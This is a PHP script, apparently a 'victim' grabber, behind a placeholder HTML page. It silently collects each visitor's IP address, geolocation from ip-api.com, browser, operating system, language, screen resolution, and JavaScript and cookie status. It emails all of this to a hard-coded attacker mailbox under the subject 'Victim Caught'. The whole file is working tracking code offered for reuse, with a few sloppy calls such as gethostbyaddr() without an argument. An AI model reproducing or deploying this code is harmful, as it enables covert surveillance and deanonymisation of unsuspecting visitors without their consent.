<html><!--Your Html Code--></html>

<?php
error_reporting(E_ERROR | E_PARSE);
//You are free to develop this script ^_^
?>

<?php


$IP = $_SERVER['REMOTE_ADDR']; // Saves the IP
$UA = $_SERVER['HTTP_USER_AGENT']; // Saves the User Agent
$DATE = date('l jS \of F Y h:i:s A'); // GET DATE
$tz = date_default_timezone_get(); // TIMEZONE
$rem_host = $_SERVER['SERVER_NAME']; //SERVER NAME
$serv_soft = $_SERVER['SERVER_SOFTWARE']; //Detect Type Server example : Apache \!/


$user_agent = $_SERVER['HTTP_USER_AGENT'];

#GET BROWSER FUNCTION
function getBrowser()
{
    $u_agent = $_SERVER['HTTP_USER_AGENT'];
    $bname = 'Unknown';
    $platform = 'Unknown';
    $version = "";


    // Next get the name of the useragent yes seperately and for good reason
    if (preg_match('/MSIE/i', $u_agent) && !preg_match('/Opera/i', $u_agent)) {
        $bname = 'Internet Explorer';
        $ub = "MSIE";
    } elseif (preg_match('/Firefox/i', $u_agent)) {
        $bname = 'Mozilla Firefox';
        $ub = "Firefox";
    } elseif (preg_match('/Chrome/i', $u_agent)) {
        $bname = 'Google Chrome';
        $ub = "Chrome";
    } elseif (preg_match('/Safari/i', $u_agent)) {
        $bname = 'Apple Safari';
        $ub = "Safari";
    } elseif (preg_match('/Opera/i', $u_agent)) {
        $bname = 'Opera';
        $ub = "Opera";
    } elseif (preg_match('/Netscape/i', $u_agent)) {
        $bname = 'Netscape';
        $ub = "Netscape";
    }

    // finally get the correct version number
    $known = array('Version', $ub, 'other');
    $pattern = '#(?<browser>' . join('|', $known) .
        ')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
    if (!preg_match_all($pattern, $u_agent, $matches)) {
        // we have no matching number just continue
    }

    // see how many we have
    $i = count($matches['browser']);
    if ($i != 1) {
        //we will have two since we are not using 'other' argument yet
        //see if version is before or after the name
        if (strripos($u_agent, "Version") < strripos($u_agent, $ub)) {
            $version = $matches['version'][0];
        } else {
            $version = $matches['version'][1];
        }
    } else {
        $version = $matches['version'][0];
    }

    // check if we have a number
    if ($version == null || $version == "") {
        $version = "?";
    }

    return array(
        'userAgent' => $u_agent,
        'name' => $bname,
        'version' => $version,
        'pattern' => $pattern
    );
}

#GET OS FUNCTION
function getOS()
{
    global $user_agent;

    $os_platform = "Unknown OS Platform";

    $os_array = array(
        '/windows nt 10/i' => ' Windows NT 10(Windows 10)',
        '/windows nt 6.3/i' => 'Windows NT 6.3(Windows 8.1)',
        '/windows nt 6.2/i' => 'Windows NT 6.2(Windows 8)',
        '/windows nt 6.1/i' => 'Windows NT 6.1(Windows 7)',
        '/windows nt 6.0/i' => 'Windows NT 6.0(Windows Vista)',
        '/windows nt 5.2/i' => 'Windows NT 5.2(Windows Server 2003/XP x64)',
        '/windows nt 5.1/i' => 'Windows NT 5.1(Windows XP)',
        '/windows xp/i' => 'Windows XP',
        '/windows nt 5.0/i' => 'Windows NT 5.0(Windows 2000)',
        '/windows me/i' => 'Windows ME',
        '/win98/i' => 'Windows 98',
        '/win95/i' => 'Windows 95',
        '/win16/i' => 'Windows 3.11',
        '/macintosh|mac os x/i' => 'Mac OS X',
        '/mac_powerpc/i' => 'Mac OS 9',
        '/linux/i' => 'Linux',
        '/ubuntu/i' => 'Ubuntu',
        '/iphone/i' => 'iPhone',
        '/ipod/i' => 'iPod',
        '/ipad/i' => 'iPad',
        '/android/i' => 'Android',
        '/blackberry/i' => 'BlackBerry',
        '/webos/i' => 'Mobile'
    );

    foreach ($os_array as $regex => $value) {

        if (preg_match($regex, $user_agent)) {
            $os_platform = $value;
        }

    }

    return array('os' => $os_platform);

}

#GET SYSTEM LANGUAGE FUNCTION
function getUserLanguage()
{
    $langs = array();
    if (isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
// break up string into pieces (languages and q factors)
        preg_match_all('/([a-z]{1,8}(-[a-z]{1,8})?)\s*(;\s*q\s*=\s*(1|0\.[0-9]+))?/i',
            $_SERVER['HTTP_ACCEPT_LANGUAGE'], $lang_parse);
        if (count($lang_parse[1])) {
// create a list like â??enâ?? => 0.8
            $langs = array_combine($lang_parse[1], $lang_parse[4]);
// set default to 1 for any without q factor
            foreach ($langs as $lang => $val) {
                if ($val === '') $langs[$lang] = 1;
            }
// sort list based on value
            arsort($langs, SORT_NUMERIC);
        }
    }
//extract most important (first)
    foreach ($langs as $lang => $val) {
        break;
    }
//if complex language simplify it
    if (stristr($lang, "-")) {
        $tmp = explode("-", $lang);
        $lang = $tmp[0];
    }
    return $lang;
}

function screenResolution()
{
    session_start();
    if (isset($_SESSION['screen_width']) AND isset($_SESSION['screen_height'])) {
        $res = $_SESSION['screen_width'] . 'x' . $_SESSION['screen_height'];
    } else if (isset($_REQUEST['width']) AND isset($_REQUEST['height'])) {
        $_SESSION['screen_width'] = $_REQUEST['width'];
        $_SESSION['screen_height'] = $_REQUEST['height'];
        header('Location: ' . $_SERVER['PHP_SELF']);
    } else {
        echo '<script type="text/javascript">window.location = "' . $_SERVER['PHP_SELF'] . '?width="+screen.width+"&height="+screen.height;</script>';
    }
    return $res;
}

function isJSenabled()
{
    if (!isset($_SESSION['js']) || $_SESSION['js'] == "") {
        echo "<noscript><meta http-equiv='refresh' content='0;url=/get-javascript-status.php&js=0'> </noscript>";
        $js = true;

    } elseif (isset($_SESSION['js']) && $_SESSION['js'] == "0") {
        $js = false;
        $_SESSION['js'] = "";

    } elseif (isset($_SESSION['js']) && $_SESSION['js'] == "1") {
        $js = true;
        $_SESSION['js'] = "";
    }

    if ($js) {
        $enabled = 'Javascript is enabled';
    } else {
        $enabled = 'Javascript is disabled';
    }
    return $enabled;
}

function areCOOKIESenabled()
{
    setcookie("test_cookie", "test", time() + 3600, '/');
    if (count($_COOKIE) > 0) {
        $cookies = "Cookies are enabled.";
    } else {
        $cookies = "Cookies are disabled.";
    }
    return $cookies;
}

$location = "http://ip-api.com/json/" . $IP;
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $location);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
$resultLocation = curl_exec($curl);
curl_close($curl);


$func = getBrowser();
$func1 = getOS();

$Browser = $func['name'] . " v." . $func['version'];
$OS = $func1['os'];
$SystemLanguage = getUserLanguage($lang);
$Resolution = screenResolution($res);
$Javascript = isJSenabled($enabled);
$Cookie = areCOOKIESenabled($cookies);



// IP Lookup API //
//http://ip-api.com/json/


$to = "thekingisback119@gmail.com"; // Your eMaIL Here
$subject = "[+] $IP | \!/ Victim Caught \!/";
$from = "notify@ghost.com";
$headers .= 'From:' . $from . "\n";
$headers .= 'Reply-To:' . $from . "\n";


//SEND INFOS
$msg .= "YOUR VICTIM LOGGED ON THE : " . $DATE . "\r\n";
$msg .= "VICTIM COMPUTER NAME (-PHP 5.4) : " . gethostname() . "\r\n"; //Get Computer Username for less than php version 5.4
$msg .= "VICTIM COMPUTER NAME (+PHP 5.4) : " . gethostbyaddr() ."\r\n"; //Get Computer Username higher than php version 5.4
$msg .= "IP VICTIM : " . $IP . "\r\n";
$msg .= "USER AGENT : " . $UA . "\r\n";
$msg .= "REMOTE HOST : " . $rem_host . "\r\n";
$msg .= "TYPE SERVER : " . $serv_soft . "\r\n";
$msg.="GeoIp:\r\n";

foreach(json_decode($resultLocation) as $key => $val){
    $msg.="--".$key. "-- = ".$val."\r\n";
}
$msg .= "Browser name & Version : " . $Browser . "\r\n";
$msg .= "Operating system : " . $OS . "\r\n";
$msg .= "Screen Resolution : " . $Resolution . "\r\n";
$msg .= "System language : " . $SystemLanguage . "\r\n";
$msg .= "Javascript : " . $Javascript . "\r\n";
$msg .= "Cookies : " . $Cookie . "\r\n";


mail($to, $subject, $msg, $headers);


?>			